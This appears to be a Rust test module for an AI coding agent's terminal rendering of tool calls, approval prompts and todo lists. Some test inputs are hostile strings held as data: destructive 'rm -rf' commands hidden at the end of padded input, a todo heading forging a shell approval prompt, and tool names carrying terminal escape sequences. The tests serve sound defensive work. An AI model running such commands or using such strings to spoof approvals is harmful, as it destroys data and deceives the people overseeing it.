    /// invariant covers the "does not run off the edge" half; this covers the half that matters to
    /// a reader, that the value at the bottom is still on screen and still under a bullet.
    #[test]
    fn test_nesting_past_the_indent_ceiling_still_shows_the_value() {
        let mut deep = serde_json::json!({"k": "PAYLOAD"});
        for _ in 0..14 {
            deep = serde_json::json!([deep]);
        }
        let width = 40;
        let rendered = super::render_tool_params(
            &serde_json::json!({"a": deep}),
            width,
            BlockLimits::indicator(),
        );
        let indents: Vec<usize> = rendered
            .iter()
            .map(|line| line.len() - line.trim_start_matches(' ').len())
            .collect();
        assert!(
            indents.iter().all(|indent| *indent <= width / 2),
            "indent grew past the ceiling: {:?}",
            indents
        );
        assert!(
            rendered.iter().any(|line| line.trim() == "-"),
            "bullets vanished: {:?}",
            rendered
        );
        assert!(
            rendered.iter().any(|line| line.contains("k: PAYLOAD")),
            "the value at the bottom was swallowed: {:?}",
            rendered
        );
    }

    /// The failure that made a decision surface show less than a notification: a 90 KB
    /// `execute_command` filled every row the wrap was given and stopped, leaving the end of the
    /// pipeline -- where `; rm -rf /` lives -- off the last row. The `full` indicator, which elides
    /// from the middle, showed that tail. Whatever else is cut, an approval keeps the end.
    #[test]
    fn test_an_approval_keeps_the_end_of_a_command_too_long_to_show() {
        let command = format!("echo start; {} ; rm -rf /important", "PAD".repeat(30000));
        let rendered =
            super::render_approval_params(&serde_json::json!({ "command": command }), 80);
        let joined = rendered.join("\n");
        assert!(
            joined.contains("rm -rf /important"),
            "the end of the command was hidden: {:?}",
            rendered.last()
        );
        assert!(joined.contains("echo start"), "the start went instead");
        assert!(
            rendered.iter().any(|row| row.contains("more characters")),
            "nothing said how much was omitted: {:?}",
            rendered
        );
    }

    /// The line that names dropped arguments was the one line in the block composed without a
    /// budget: `  ... 240 more arguments: ` is twenty-six columns before a single name is added, so
    /// it broke the width at every width the resolver can produce below twenty-seven.
    #[test]
    fn test_the_line_naming_dropped_arguments_fits_the_width() {
        let input = serde_json::Value::Object(
            (0..300)
                .map(|index| (format!("o{:03}", index), serde_json::json!("v")))
                .collect(),
        );
        for width in [MIN_OUTPUT_WIDTH, 21, 25, 26, 27, 40, 80] {
            for limits in [
                super::BlockLimits::indicator(),
                super::BlockLimits::approval(),
            ] {
                let rendered = super::render_tool_params(&input, width, limits);
                let last = rendered.last().cloned().unwrap_or_default();
                // At the narrow end the word itself is cut; the marker and the count survive, which
                // is what tells a reader something was dropped. How many go depends on the limits,
                // so the count is not pinned here.
                assert!(last.trim_start().starts_with("... "), "{:?}", last);
                assert!(
                    last.chars().any(|character| character.is_ascii_digit()),
                    "no count survived: {:?}",
                    last
                );
                assert!(
                    super::display_width(&last) <= width,
                    "width {}: {} columns in {:?}",
                    width,
                    super::display_width(&last),
                    last
                );
            }
        }
    }

    /// `block_rows` is checked before an argument is rendered, so the block reaches it plus one
    /// argument's own budget. That sum is the real ceiling and the number the docs quote; leaving
    /// the per-argument cap sharing `block_rows` made it twice what the field claimed.
    #[test]
    fn test_a_block_stays_inside_the_ceiling_its_limits_add_up_to() {
        for limits in [
            super::BlockLimits::indicator(),
            super::BlockLimits::approval(),
        ] {
            // The worst case needs the huge argument to be the one that *crosses* the line, so the
            // block must be one row short of its gate when that argument is reached. Padding past
            // the gate instead drops the huge one by name and never renders it, which is a block of
            // `block_rows` and proves nothing -- as this test did until its own mutation check
            // survived.
            let mut fields = serde_json::Map::new();
            for index in 0..limits.block_rows - 1 {
                fields.insert(format!("a{:04}", index), serde_json::json!("v"));
            }
            // Sorts after every `a...`, so it is rendered last.
            fields.insert(
                "zzz".to_string(),
                serde_json::Value::from((0..10_000).collect::<Vec<u32>>()),
            );
            let rendered =
                super::render_tool_params(&serde_json::Value::Object(fields), 80, limits);
            assert!(
                rendered.iter().any(|row| row.contains("zzz")),
                "the huge argument was dropped, so the sum is untested"
            );
            let ceiling = limits.block_rows + limits.rows_per_argument + 1;
            assert!(
                rendered.len() <= ceiling,
                "{} rows against a ceiling of {}",
                rendered.len(),
                ceiling
            );
        }
    }

    /// An argument that has already reported `... 480 more lines` must not lose that line to the
    /// row cap above it: the block then admitted to two dropped rows and said nothing about the
    /// hundreds of lines that actually went.
    #[test]
    fn test_a_row_cut_does_not_delete_the_line_count_beneath_it() {
        let body = (0..500)
            .map(|index| format!("line {} {}", index, "x".repeat(280)))
            .collect::<Vec<_>>()
            .join("\n");
        let rendered = super::render_approval_params(&serde_json::json!({ "content": body }), 80);
        assert!(
            rendered.iter().any(|row| row.contains("more lines")),
            "the line count was cut away: {:?}",
            rendered.last()
        );
    }

    /// A per-line ceiling is not enough on its own: one line may wrap to twenty rows, so two
    /// thousand lines of reasoning fill forty thousand rows of terminal.
    #[test]
    fn test_a_full_thinking_block_has_a_ceiling() {
        let reasoning = (0..2000)
            .map(|index| format!("reasoning line {} {}", index, "y".repeat(300)))
            .collect::<Vec<_>>()
            .join("\n");
        let body = super::thinking_block_text(&reasoning, true, 80);
        assert!(
            body.lines().count() <= super::THINKING_MAX_ROWS,
            "{} rows",
            body.lines().count()
        );
        assert!(
            body.lines().any(|line| line.contains("more rows")),
            "the cut was silent"
        );
    }

    /// meka's measure has to be at least what the terminal paints, or a budget is a promise it
    /// cannot keep. `unicode_width` merges an emoji and its skin-tone modifier into one two-column
    /// cluster; VTE paints two glyphs across four columns, so every skin-toned emoji in an argument
    /// was a two-times under-count. This pins the direction of the disagreement rather than a
    /// number: over-counting shows less than might have fit, under-counting runs off the row.
    #[test]
    fn test_the_measure_is_never_less_than_a_terminal_would_paint() {
        assert_eq!(super::display_width("\u{1F44D}\u{1F3FB}"), 4);
        assert_eq!(super::display_width("\u{1F44D}"), 2);
        // Plain text is unaffected, which is what makes over-counting an acceptable trade.
        assert_eq!(super::display_width("hello"), 5);
        assert_eq!(super::display_width("\u{6F22}\u{5B57}"), 4);
    }

    /// Width is **not** order-independent, so a tail taken by reversing the string is measured in
    /// an order that is never printed: `display_width` scores a thumbs-up followed by a
    /// skin-tone modifier as one two-column cluster and the same two characters reversed as
    /// four columns. An argument of reversed pairs came back a third over its budget, and the
    /// composed indicator ran to 100 columns where 80 was asked for.
    ///
    /// Two changes close this and either would do it alone: measuring the suffix that is printed,
    /// and taking the larger of the two width measures (a per-character sum does not care about
    /// order, so the reversal stops mattering). They are kept together because the first is correct
    /// without depending on a property of the second, and this test fails only if both go --
    /// `test_the_measure_is_never_less_than_a_terminal_would_paint` pins the other on its own.
    #[test]
    fn test_a_tail_is_measured_in_the_order_it_is_printed() {
        let payload = "\u{1F3FB}\u{1F44D}a".repeat(400);
        for budget in [20usize, 40, 80, 160] {
            let elided = super::elide_to_width(&payload, budget);
            assert!(
                super::display_width(&elided) <= budget,
                "budget {} gave {} columns",
                budget,
                super::display_width(&elided)
            );
        }
        let line = super::tool_indicator_line(
            "execute_command",
            &serde_json::json!({ "command": payload }),
            None,
            80,
        );
        assert!(
            super::display_width(&line) <= 80,
            "{} columns",
            super::display_width(&line)
        );
    }

    /// A character meka scores at zero columns and a terminal paints anyway is a way to push text
    /// off a row while the budget says it fits -- and U+3164 paints *blank*, so the overrun is
    /// invisible. The rule is by measured width rather than by category, so it needs no list of
    /// which characters are currently known to behave this way.
    #[test]
    fn test_a_character_worth_no_columns_never_reaches_the_terminal() {
        for probe in [
            '\u{3164}',  // HANGUL FILLER: gc=Lo, not a control, not a format character.
            '\u{FFA0}',  // HALFWIDTH HANGUL FILLER.
            '\u{2065}',  // Unassigned default-ignorable.
            '\u{0301}',  // COMBINING ACUTE: the cost of the rule, and the reason it is stated.
            '\u{E0001}', // Deprecated language tag.
            '\u{00ad}',  // SOFT HYPHEN, the case that started this.
        ] {
            let sanitized = super::sanitize_to_line(&probe.to_string().repeat(200), usize::MAX);
            assert!(
                sanitized.is_empty(),
                "U+{:04X} survived as {} characters",
                probe as u32,
                sanitized.chars().count()
            );
        }
        // A space still separates what it separated, because the rule runs after whitespace is
        // flattened rather than before.
        assert_eq!(super::sanitize_to_line("a\nb", usize::MAX), "a b");
    }

    /// Fitting text to a budget re-measures a growing prefix, so a character that never advances
    /// the count made the loop walk the whole string and re-measure it every step. Forty
    /// thousand combining marks in a tool name -- which is model-supplied, unvalidated, and
    /// rendered in every `tool_params` mode including `off` -- froze the REPL for minutes.
    #[test]
    fn test_fitting_text_to_a_budget_is_bounded_by_the_budget() {
        let zalgo = format!("{}{}", "\u{0301}".repeat(40_000), "A".repeat(300));
        let started = std::time::Instant::now();
        let fitted = super::sanitize_to_line(&zalgo, 60);
        assert!(super::display_width(&fitted) <= 60);
        let line = super::tool_indicator_line(&zalgo, &serde_json::json!({}), None, 80);
        assert!(super::display_width(&line) <= 80);
        // Generous by three orders of magnitude against the quadratic version, which took minutes
        // in this build. A wall-clock assertion is crude, but the property *is* about time.
        assert!(
            started.elapsed() < std::time::Duration::from_secs(5),
            "took {:?}",
            started.elapsed()
        );
    }

    /// The property `elide_to_width` exists for, checked through the paths that call it rather than
    /// on the helper alone. MCP names agree on their prefix, so a tail cut collapses two different
    /// tools onto one string -- and the header, the indicator and the prompt each cut a name.
    #[test]
    fn test_two_mcp_names_stay_apart_through_every_path_that_cuts_one() {
        // These agree for fourteen characters, so a budget that keeps fewer collapses them.
        let search = "mcp__exa__web_search_exa";
        let fetch = "mcp__exa__web_fetch_exa";
        assert_ne!(
            super::tool_header(search, 24),
            super::tool_header(fetch, 24),
            "the bare header collapsed two tools onto one string"
        );

        // The indicator only cuts a name when `TOOL_NAME_MAX_WIDTH` is what bites -- below that it
        // drops the argument and defers to the header -- so this needs a hallucinated name past the
        // cap, with room left over for an argument.
        let long_search = format!("mcp__{}__web_search_exa", "x".repeat(60));
        let long_fetch = format!("mcp__{}__web_fetch_exa", "x".repeat(60));
        let argument = serde_json::json!({});
        assert_ne!(
            super::tool_indicator_line(&long_search, &argument, Some("query"), 100),
            super::tool_indicator_line(&long_fetch, &argument, Some("query"), 100),
            "the indicator collapsed two tools onto one string"
        );

        // And the cap that made the cut happen at all. A name is model-supplied and unvalidated at
        // render time, so without a bound a hallucinated one takes the whole line and the argument
        // never appears, however wide the terminal is.
        let hallucinated = "n".repeat(400);
        let line = super::tool_indicator_line(&hallucinated, &argument, Some("query"), 400);
        assert!(
            line.contains("query"),
            "the argument was crowded out: {}",
            line
        );
        let name_columns = super::display_width(&line) - super::display_width("[tool (`query`)]");
        assert!(
            name_columns <= super::TOOL_NAME_MAX_WIDTH,
            "the name took {} columns",
            name_columns
        );
    }

    /// Wrapping a line of source has to keep it looking like source: continuation rows carry the
    /// line's own leading whitespace, and a break never lands inside that whitespace, which would
    /// emit a row that is empty once trimmed and silently dedent everything after it.
    #[test]
    fn test_a_wrapped_line_keeps_its_indentation_on_every_row() {
        let source = format!("        {}", "let value = compute(argument); ".repeat(8));
        let rows = super::wrap_to_width(&source, 40, 20);
        assert!(rows.len() > 2, "expected wrapping: {:?}", rows);
        for row in rows.iter().skip(1) {
            assert!(
                row.starts_with("        "),
                "continuation lost the indent: {:?}",
                row
            );
            assert!(!row.trim().is_empty(), "an all-whitespace row: {:?}", row);
        }

        // The other half: a line whose only space is the indent itself, so the last space that fits
        // sits inside it. Breaking there emits a row that is empty once trimmed and drops the
        // indentation of everything below.
        let unbroken = format!("    {}", "X".repeat(200));
        let rows = super::wrap_to_width(&unbroken, 40, 20);
        assert!(
            rows[0].starts_with("    X"),
            "broke inside the indent: {:?}",
            rows[0]
        );
        for row in &rows {
            assert!(!row.trim().is_empty(), "an all-whitespace row: {:?}", rows);
        }
    }

    /// The numbers the docs quote, asserted as numbers. Deriving a bound from the very limits under
    /// test made `rows_per_argument` unfalsifiable: raising it tenfold still passed.
    #[test]
    fn test_the_block_ceilings_are_the_ones_the_docs_quote() {
        let indicator = super::BlockLimits::indicator();
        assert_eq!(indicator.lines_per_argument, 30);
        assert_eq!(indicator.rows_per_argument, 32);
        assert_eq!(indicator.block_rows, 60);
        assert_eq!(
            indicator.block_rows + indicator.rows_per_argument + 1,
            93,
            "config-file.md quotes 93 rows"
        );
        let approval = super::BlockLimits::approval();
        assert_eq!(approval.lines_per_argument, 20);
        assert_eq!(approval.rows_per_argument, 60);
        assert_eq!(approval.block_rows, 100);
        assert_eq!(
            approval.block_rows + approval.rows_per_argument + 1,
            161,
            "permissions.md quotes 161 rows"
        );
    }

    #[test]
    fn test_a_bare_array_input_is_capped_like_any_other_block() {
        let items: Vec<u32> = (0..5000).collect();
        let rendered = params(serde_json::Value::from(items));
        let limits = super::BlockLimits::indicator();
        assert!(
            rendered.lines().count() <= limits.block_rows + 1,
            "{} rows",
            rendered.lines().count()
        );
        assert!(
            rendered
                .lines()
                .any(|line| line.trim_start().starts_with("... ") && line.ends_with(" more rows")),
            "{}",
            rendered
        );
        assert!(rendered.ends_with("- 4999"), "{}", rendered);
    }

    /// A block cap that cuts a flat line list wherever line 60 lands drops the trailing arguments
    /// silently and reports a count of rendered lines that says nothing about how much is hidden.
    /// Losing `path` entirely would make `full` less informative than `summary`.
    #[test]
    fn test_arguments_that_do_not_fit_are_named_rather_than_dropped() {
        let long = (0..40)
            .map(|index| format!("line {}", index))
            .collect::<Vec<_>>()
            .join("\n");
        let rendered = params(serde_json::json!({
            "first": long.clone(),
            "second": long.clone(),
            "third": long,
            "path": "src/render.rs",
        }));
        assert!(
            rendered.ends_with("  ... 2 more arguments: third, path"),
            "{}",
            rendered
        );
        // Each argument that did fit keeps its own count, at its own indent.
        assert_eq!(rendered.matches("    ... 10 more lines").count(), 2);
    }

    /// The failure the per-argument budget exists to prevent: one enormous argument consuming the
    /// whole block and taking every argument after it down silently, so a `write_file` shows 60
    /// lines of `content` and never says which file.
    #[test]
    fn test_one_huge_argument_no_longer_hides_the_ones_after_it() {
        let long = (0..1000)
            .map(|index| format!("line {}", index))
            .collect::<Vec<_>>()
            .join("\n");
        let rendered = params(serde_json::json!({"content": long, "path": "a.txt"}));
        assert!(rendered.contains("    ... 970 more lines"), "{}", rendered);
        assert!(rendered.ends_with("  path: a.txt"), "{}", rendered);
    }

    /// A `write_file` body almost always ends with a newline. Treating that as multi-line turned a
    /// one-line value into a bare `key:` plus a single indented line.
    #[test]
    fn test_a_trailing_newline_does_not_split_a_one_line_value() {
        assert_eq!(
            params(serde_json::json!({"content": "one line\n"})),
            "  content: one line"
        );
    }

    /// The name identifies the call and the argument refines it, so when only one fits it is the
    /// name that survives. Reserving for the argument first rendered
    /// `mcp__exa__web_search_exa` as `mc`, which is not a shortened name but a different one.
    #[test]
    fn test_a_narrow_line_keeps_the_whole_name_and_drops_the_argument() {
        let line = super::tool_indicator_line(
            "mcp__exa__web_search_exa",
            &serde_json::json!({}),
            Some("Jane Street first mortgage-backed securities desk"),
            37,
        );
        assert_eq!(line, "[tool mcp__exa__web_search_exa]");
        assert!(super::display_width(&line) <= 37, "{}", line);
    }

    /// Given room for both, the argument still appears.
    #[test]
    fn test_a_wide_line_keeps_the_name_and_the_argument() {
        let line = super::tool_indicator_line(
            "mcp__exa__web_search_exa",
            &serde_json::json!({}),
            Some("Jane Street"),
            80,
        );
        assert_eq!(line, "[tool mcp__exa__web_search_exa(`Jane Street`)]");
    }

    /// The floor is the precondition every width bound in this file rests on, so it has to hold on
    /// both paths into the resolver: a configured width and a measured terminal. A configured width
    /// otherwise wins outright, which is the whole point of setting one.
    #[test]
    fn test_the_resolved_width_is_never_below_what_can_be_composed() {
        for measured in [None, Some(0), Some(1), Some(10), Some(200)] {
            assert!(
                super::resolve_output_width(None, measured) >= super::MIN_OUTPUT_WIDTH,
                "measured {:?}",
                measured
            );
            assert!(
                super::resolve_output_width(Some(1), measured) >= super::MIN_OUTPUT_WIDTH,
                "measured {:?}",
                measured
            );
        }
        assert_eq!(super::resolve_output_width(Some(120), Some(40)), 120);
        assert_eq!(super::resolve_output_width(None, Some(40)), 40);
        assert_eq!(
            super::resolve_output_width(None, None),
            super::FALLBACK_OUTPUT_WIDTH
        );
        // A terminal that reports nothing is not a terminal one column wide.
        assert_eq!(
            super::resolve_output_width(None, Some(0)),
            super::FALLBACK_OUTPUT_WIDTH
        );
    }

    /// The tail of an elision is taken by reversing the string, taking a prefix, and reversing
    /// back. Combining marks and regional-indicator pairs are where that trick could measure
    /// one thing and print another, and neither shape appears in the block-level inputs above.
    #[test]
    fn test_keeping_both_ends_never_exceeds_the_budget() {
        let probes = [
            "e\u{0301}".repeat(60),
            "\u{1F1E6}\u{1F1E7}".repeat(40),
            "a\u{0300}\u{0301}\u{0302}b".repeat(30),
            "漢".repeat(60),
            "😀".repeat(40),
        ];
        for probe in &probes {
            for budget in 1..40usize {
                let elided = super::elide_to_width(probe, budget);
                assert!(
                    super::display_width(&elided) <= budget,
                    "budget {} gave {} columns",
                    budget,
                    super::display_width(&elided)
                );
            }
        }
        // The name's own promise, over the range where it is made: below a marker plus two columns
        // there is no room for two ends and `elide_to_width` says so by falling back to a tail cut.
        let path = "/home/you/projects/meka/docs/book/src/configuration/config-file.md";
        for budget in 6..40usize {
            let elided = super::elide_to_width(path, budget);
            assert!(
                elided.starts_with('/'),
                "lost the head at {}: {}",
                budget,
                elided
            );
            assert!(
                elided.ends_with(|last: char| last != '.'),
                "lost the tail at {}: {}",
                budget,
                elided
            );
        }
    }

    /// A character wider than the whole budget has no row that can hold it. Taking it anyway was
    /// the way out of the loop, and it put a two-column character on a one-column row; a marker
    /// says the same thing and fits.
    #[test]
    fn test_a_wrapped_row_never_exceeds_its_budget() {
        for budget in 1..12usize {
            for rows in [1usize, 3, 10] {
                for text in ["漢字漢字漢字", "  漢字漢字", "aaa bbb ccc", "😀😀😀", ""]
                {
                    for row in super::wrap_to_width(text, budget, rows) {
                        assert!(
                            super::display_width(&row) <= budget,
                            "budget {} gave {:?}",
                            budget,
                            row
                        );
                    }
                }
            }
        }
    }

    /// A cut that cannot fit its marker must not emit the bare prefix, which reads as a complete
    /// name. Whatever the budget, the output has to say it was cut.
    #[test]
    fn test_a_cut_always_says_it_was_cut() {
        for budget in 1..=4 {
            let cut = super::truncate_to_width("mcp__exa__web_search_exa", budget);
            // The marker, not merely a dot: the probe happens to contain none, so `contains('.')`
            // would have passed on an implementation that emitted one from the text.
            assert!(
                cut.ends_with(
                    &super::TRUNCATION_MARKER[..super::TRUNCATION_MARKER.len().min(budget)]
                ),
                "budget {} produced {:?}",
                budget,
                cut
            );
            assert!(
                super::display_width(&cut) <= budget,
                "budget {} produced {:?}",
                budget,
                cut
            );
        }
    }

    /// A path is back-loaded like an MCP name: cutting the tail keeps the directories and loses the
    /// filename, which is what you were reading it for. This is the commonest argument shape there
    /// is, and at 80 columns the old tail cut dropped the name of the file being read.
    #[test]
    fn test_a_long_path_argument_keeps_its_filename() {
        let line = super::tool_indicator_line(
            "read_file",
            &serde_json::json!({}),
            Some("/home/you/projects/meka/docs/book/src/configuration/config-file.md"),
            80,
        );
        assert!(line.contains("config-file.md"), "{}", line);
        assert!(line.starts_with("[tool ReadFile(`/home"), "{}", line);
        assert!(super::display_width(&line) <= 80, "{}", line);
    }

    /// Same reasoning one level down: a value sitting on its key line is an identifier too, so a
    /// `path:` in a `full` block keeps its filename rather than six directories.
    #[test]
    fn test_a_long_path_value_in_a_block_keeps_its_filename() {
        // At a width that actually cuts. Rendered at `TEST_WIDTH` the 66-column path fits whole, so
        // the assertions held for any implementation at all and the mutation survived.
        let rendered = super::render_tool_params(
            &serde_json::json!({
                "path": "/home/you/projects/meka/docs/book/src/configuration/config-file.md"
            }),
            40,
            super::BlockLimits::indicator(),
        )
        .join("\n");
        assert!(rendered.contains("..."), "nothing was cut: {}", rendered);
        assert!(rendered.contains("config-file.md"), "{}", rendered);
        assert!(rendered.starts_with("  path: /home"), "{}", rendered);
    }

    /// A line of source runs left to right, so a hole in its middle would misrepresent it. Only
    /// identifiers are elided from the middle.
    #[test]
    fn test_a_content_line_is_cut_from_the_tail_not_the_middle() {
        let body = format!("fn main() {{\n{}\n}}", "    let x = compute(".repeat(20));
        let rendered = params(serde_json::json!({ "content": body }));
        let long = rendered
            .lines()
            .find(|line| line.contains("compute"))
            .unwrap_or_default();
        assert!(long.ends_with("..."), "{:?}", long);
        assert!(
            !long.contains("...l"),
            "middle-elided a content line: {:?}",
            long
        );
    }

    /// MCP names agree on their prefix and differ at the end, so a tail cut collapses two different
    /// tools onto the same string.
    #[test]
    fn test_two_mcp_names_stay_distinguishable_when_elided() {
        let search = super::elide_to_width("mcp__exa__web_search_exa", 20);
        let fetch = super::elide_to_width("mcp__exa__web_fetch_exa", 20);
        assert_ne!(search, fetch, "elided to the same string");
        assert!(search.starts_with("mcp__exa"), "{}", search);
        assert!(search.ends_with("exa"), "{}", search);
    }

    /// The budget is the whole line, so a long key has to leave room for the value rather than
    /// spending the width and letting it overflow.
    #[test]
    fn test_a_long_key_still_leaves_room_for_its_value() {
        let rendered = params(serde_json::json!({"k".repeat(5000): "v".repeat(5000)}));
        assert_eq!(rendered.lines().count(), 1, "{}", rendered);
        assert!(
            super::display_width(&rendered) <= TEST_WIDTH,
            "{}",
            rendered
        );
        let value = rendered.rsplit(": ").next().unwrap_or_default();
        assert!(
            super::display_width(value) >= super::TOOL_VALUE_MIN_WIDTH,
            "value got {} columns",
            super::display_width(value)
        );
    }

    /// The name arrives verbatim off the provider stream and the indicator is emitted before the
    /// registry is consulted, so a hallucinated one reaches the terminal unvalidated.
    #[test]
    fn test_a_tool_name_is_sanitized_in_every_style() {
        let forged = "read_file\u{1b}[2J\u{1b}[1;1H";
        for style in [ToolParams::Off, ToolParams::Summary, ToolParams::Full] {
            let (header, _) = super::tool_indicator_parts(
                forged,
                &serde_json::json!({}),
                None,
                style,
                TEST_WIDTH,
            );
            assert!(!header.contains('\u{1b}'), "{}: {:?}", style, header);
            assert_eq!(header.lines().count(), 1, "{}: {:?}", style, header);
        }
    }

    /// Swapping two arms of the style match would otherwise pass the whole suite, since every piece
    /// it dispatches to is only tested on its own.
    #[test]
    fn test_each_style_selects_the_output_it_names() {
        let input = serde_json::json!({"path": "/etc/hosts"});
        let (off, off_block) = super::tool_indicator_parts(
            "read_file",
            &input,
            Some("/etc/hosts"),
            ToolParams::Off,
            TEST_WIDTH,
        );
        assert_eq!(off, "[tool ReadFile]");
        assert!(off_block.is_empty());

        let (summary, summary_block) = super::tool_indicator_parts(
            "read_file",
            &input,
            Some("/etc/hosts"),
            ToolParams::Summary,
            TEST_WIDTH,
        );
        assert_eq!(summary, "[tool ReadFile(`/etc/hosts`)]");
        assert!(summary_block.is_empty());

        let (full, full_block) = super::tool_indicator_parts(
            "read_file",
            &input,
            Some("/etc/hosts"),
            ToolParams::Full,
            TEST_WIDTH,
        );
        assert_eq!(full, "[tool ReadFile]", "the header drops its argument");
        assert_eq!(full_block, vec!["  path: /etc/hosts".to_string()]);
    }

    #[test]
    fn test_a_non_object_input_still_renders_its_value() {
        assert_eq!(params(serde_json::json!("bare")), "  bare");
    }

    /// Falling through to `Value::to_string` prints a top-level array as raw JSON, contradicting
    /// the format's own rule that arrays are bullets. The todo list prints unindented at column
    /// zero, so model text carrying a newline needs no trick at all to sit among meka's own output
    /// looking like part of it.
    #[test]
    fn test_a_todo_list_cannot_plant_a_line_of_its_own() {
        use crate::tools::todo::{TodoItem, TodoStatus};

        assert_eq!(
            super::todo_heading(Some("Plan\n[ask] Shell rm -rf / (Y/n) y"), TEST_WIDTH),
            "TODO: Plan [ask] Shell rm -rf / (Y/n) y"
        );
        let item = TodoItem {
            text: "step\u{1b}[2J\rdone".to_string(),
            status: TodoStatus::Pending,
        };
        let rendered = super::todo_item_text(&item, TEST_WIDTH);
        assert!(!rendered.contains('\u{1b}'), "{:?}", rendered);
        assert!(!rendered.contains('\r'), "{:?}", rendered);
        assert_eq!(rendered.lines().count(), 1, "{:?}", rendered);
    }

    #[test]
    fn test_a_top_level_array_input_is_bulleted_like_any_other_array() {
        assert_eq!(
            params(serde_json::json!(["read_file", "edit_file"])),
            "  - read_file\n  - edit_file"
        );
    }

    /// A tab cannot move the cursor left or up, so it forges nothing and never needed flattening.
    /// Collapsing it to one space destroyed the indentation of every tab-indented file.
    #[test]
    fn test_tabs_are_expanded_so_indented_code_survives() {
        assert_eq!(
            params(serde_json::json!({"content": "func main() {\n\tif ok {\n\t\treturn\n\t}\n}"})),
            "  content:\n    func main() {\n        if ok {\n            return\n        }\n    }"
        );
    }

    /// Reporting a tab as `(empty)` is not vague, it is wrong: it says the model passed `""`.
    #[test]
    fn test_a_whitespace_only_value_is_not_reported_as_empty() {
        assert_eq!(
            params(serde_json::json!({"delimiter": "\t", "body": "", "pad": " ".repeat(300)})),
            "  delimiter: (whitespace)\n  body: (empty)\n  pad: (whitespace)"
        );
    }

    /// `truncate_display` counted characters, so a "200 character" cap let a full-width line take
    /// 400 columns and wrap into rows the cap exists to prevent.
    #[test]
    fn test_the_width_cap_counts_columns_not_characters() {
        let wide = "\u{ff21}".repeat(300);
        let rendered = params(serde_json::json!({"a": wide}));
        assert!(
            super::display_width(&rendered) <= TEST_WIDTH,
            "{} columns",
            super::display_width(&rendered)
        );
    }

    #[test]
    fn test_the_elision_count_is_singular_at_one() {
        let body = (0..super::BlockLimits::indicator().lines_per_argument + 1)
            .map(|index| format!("line {}", index))
            .collect::<Vec<_>>()
            .join("\n");
        assert!(
            params(serde_json::json!({"content": body})).ends_with("    ... 1 more line"),
            "expected a singular count"
        );
    }

    #[test]
    fn test_an_empty_summary_renders_bare_rather_than_as_empty_backticks() {
        assert_eq!(
            tool_indicator_line("todo", &serde_json::json!({}), Some("   "), TEST_WIDTH),
            "[tool Todo]"
        );
    }

    #[test]
    fn test_tool_display_name_mappings() {
        assert_eq!(tool_display_name("execute_command"), "Shell");
        assert_eq!(tool_display_name("read_file"), "ReadFile");
        assert_eq!(tool_display_name("write_file"), "WriteFile");
        assert_eq!(tool_display_name("edit_file"), "EditFile");
        assert_eq!(tool_display_name("find_files"), "FindFiles");
        assert_eq!(tool_display_name("search_contents"), "SearchContents");
        assert_eq!(tool_display_name("fetch_url"), "FetchUrl");
        assert_eq!(tool_display_name("search_web"), "SearchWeb");
        assert_eq!(tool_display_name("skill_read"), "Skill");
        assert_eq!(tool_display_name("render_image"), "RenderImage");
        assert_eq!(tool_display_name("custom_tool"), "custom_tool");
        // Every family member has a mapping; a missing one falls through to raw snake_case and
        // shows up beside its PascalCase siblings.
        for (name, display) in [
            ("agent_spawn", "AgentSpawn"),
            ("agent_list", "AgentList"),
            ("agent_followup", "AgentFollowup"),
            ("agent_delete", "AgentDelete"),
        ] {
            assert_eq!(tool_display_name(name), display);
        }
    }

    #[test]
    fn test_builtin_primary_param_skill() {
        let input = serde_json::json!({"name": "setup-postgres"});
        assert_eq!(
            builtin_primary_param("skill_read", &input).as_deref(),
            Some("setup-postgres")
        );
    }

    /// A cancellation has to say what it cancelled. `task_cancel` declares neither `id` nor `all`
    /// as required, so without a rule it renders as a bare tool name.
    #[test]
    fn test_builtin_primary_param_task_cancel() {
        assert_eq!(
            builtin_primary_param("task_cancel", &serde_json::json!({"id": "7f3a1c22"})).as_deref(),
            Some("7f3a1c22")
        );
        assert_eq!(
            builtin_primary_param("task_cancel", &serde_json::json!({"all": true})).as_deref(),
            Some("all")
        );
        // `all: false` alongside an id is the ordinary single cancel, not a bulk one.
        assert_eq!(
            builtin_primary_param(
                "task_cancel",
                &serde_json::json!({"id": "7f3a1c22", "all": false})
            )
            .as_deref(),
            Some("7f3a1c22")
        );
        assert_eq!(
            builtin_primary_param("task_cancel", &serde_json::json!({})),
            None
        );
    }

    /// The four MCP meta-tools that address a server deliberately show the object rather than the
    /// server, which is where the map departs from what `required[0]` would have picked.
    ///
    /// Written down because the departure looks like an oversight from the schema's side: reading
    /// `mcp_resource_read`'s `"required": ["server", "uri"]` alone, `server` is the obvious answer.
    /// It is also the useless one, identical across every call to a given server.
    #[test]
    fn test_builtin_primary_param_mcp_meta_tools_show_the_object() {
        let addressed = serde_json::json!({"server": "ida", "uri": "file:///tmp/a.i64"});
        for name in [
            "mcp_resource_read",
            "mcp_resource_subscribe",
            "mcp_resource_unsubscribe",
        ] {
            assert_eq!(
                builtin_primary_param(name, &addressed).as_deref(),
                Some("file:///tmp/a.i64"),
                "{name}"
            );
        }
        assert_eq!(
            builtin_primary_param(
                "mcp_prompt_get",
                &serde_json::json!({"server": "ida", "name": "explain"})
            )
            .as_deref(),
            Some("explain")
        );
        // The two list tools take only `server`, and it is optional: listing every server is the
        // documented default, and has nothing specific to show.
        assert_eq!(
            builtin_primary_param("mcp_resource_list", &serde_json::json!({"server": "ida"}))
                .as_deref(),
            Some("ida")
        );
        assert_eq!(
            builtin_primary_param("mcp_prompt_list", &serde_json::json!({})),
            None
        );
    }

    /// `context_compact` declares no `required`, so like `task_cancel` before it the schema
    /// fallback had nothing to reach for and the call rendered bare on every surface, not just
    /// replay.
    #[test]
    fn test_builtin_primary_param_context_compact() {
        assert_eq!(
            builtin_primary_param(
                "context_compact",
                &serde_json::json!({"instructions": "keep the design decisions"})
            )
            .as_deref(),
            Some("keep the design decisions")
        );
        assert_eq!(
            builtin_primary_param(
                "context_compact",
                &serde_json::json!({"keep_recent": false})
            ),
            None
        );
    }

    /// The whole path the indicator actually uses, not just the built-in map.
    #[test]
    fn test_resolve_primary_param_renders_a_task_cancellation() {
        let schema = serde_json::json!({
            "type": "object",
            "properties": {"id": {"type": "string"}, "all": {"type": "boolean"}}
        });
        assert_eq!(
            resolve_primary_param(
                "task_cancel",
                &serde_json::json!({"id": "7f3a1c22"}),
                Some(&schema)
            )
            .as_deref(),
            Some("7f3a1c22")
        );
    }

    #[test]
    fn test_builtin_primary_param() {
        let input = serde_json::json!({"command": "ls", "path": "/tmp"});
        assert_eq!(
            builtin_primary_param("execute_command", &input).as_deref(),
            Some("ls")
